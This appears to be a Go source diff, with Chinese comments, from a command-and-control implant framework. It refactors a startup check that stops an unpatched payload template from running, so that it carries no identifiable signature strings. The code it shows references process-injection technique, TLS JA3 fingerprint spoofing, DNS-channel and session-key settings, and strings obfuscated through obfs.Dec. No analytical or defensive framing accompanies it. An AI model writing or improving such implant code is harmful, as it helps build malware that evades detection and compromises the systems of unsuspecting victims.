@@ -340,8 +340,13 @@ func parsePlaceholderInt(ph string, def int) int {
 // 必须在静默模式重定向 stdout 之前调用（错误可见）。
 // 机制：占位符为 const 字符串字面量，patch 在二进制层面替换其字面量；
 // 未 patch 时字面量仍含 "PLACEHOLDER_12345"，命中即退出。
-func VerifyNoPlaceholderResidue() {
-	checks := []string{
+// placeholderChecks 参与"未 patch 即拒绝启动"的配置项。
+//
+// 注意 MultiEndpoints **不在**其中：它只在多传输载荷里由服务端 patch，单传输载荷
+// 本就不会替换它。残留只意味着"没有配置多端点"，不构成安全风险（不含密钥材料）——
+// 把它算进来会导致所有普通载荷一启动就拒绝运行（本次实测踩到并修复）。
+func placeholderChecks() []string {
+	return []string{
 		ReconnectBaseDelayPlaceholder,
 		ReconnectMaxRetriesPlaceholder,
 		InjectTechDefaultPlaceholder,
@@ -362,13 +367,28 @@ func VerifyNoPlaceholderResidue() {
 		TLSJA3Placeholder,
 		DNSLabelPrefixPlaceholder,
 		SessionKeyInfoPlaceholder,
-		MultiEndpoints,
 	}
-	for _, c := range checks {
+}
+
+// PlaceholderResidues 返回仍处于占位符状态的配置项（自检与测试用）
+func PlaceholderResidues() []string {
+	var out []string
+	for _, c := range placeholderChecks() {
 		if strings.Contains(c, obfs.Dec("LXbQH0u6JASAUvw=")) {
-			println(obfs.Dec("jaUL9y6pKASNUuA0dKU3lt8QMY6sPsV6vFeTgCmhehHYOKYhw16JqTfUbvZH5Khidej9UJi9OpRc1WsBzUPyOtNPz2LMLIso8hfgYJU="))
-			os.Exit(1)
+			out = append(out, c)
 		}
+	}
+	return out
+}
+
+// VerifyNoPlaceholderResidue 占位符残留统一检测（fail-closed）：
+// 任意安全敏感占位符原样残留说明模板未经服务端 patch（漏替换/旧模板），
+// 载荷携带可识别特征字符串运行（OPSEC 风险），直接拒绝启动。
+// 必须在静默模式重定向 stdout 之前调用（错误可见）。
+func VerifyNoPlaceholderResidue() {
+	if len(PlaceholderResidues()) > 0 {
+		println(obfs.Dec("jaUL9y6pKASNUuA0dKU3lt8QMY6sPsV6vFeTgCmhehHYOKYhw16JqTfUbvZH5Khidej9UJi9OpRc1WsBzUPyOtNPz2LMLIso8hfgYJU="))
+		os.Exit(1)
 	}
 }
 
